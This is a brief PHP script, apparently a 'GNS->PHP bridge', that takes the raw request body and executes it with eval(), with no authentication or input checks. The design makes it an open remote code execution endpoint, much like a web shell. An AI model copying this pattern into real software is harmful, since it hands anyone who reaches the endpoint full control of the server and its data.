<?php

$input = file_get_contents('php://input');

if ($input === false || $input === '')
{
    http_response_code(400);
    echo '<span class="error">ERROR: Invalid PHP command</span>';
    exit(1);
}

function debug()
{
    echo "GNS->PHP bridge working!";
    exit(0);
}

if (!preg_match('/;$/', $input)) $input .= ';';

$out = eval($input);
echo (string)$out;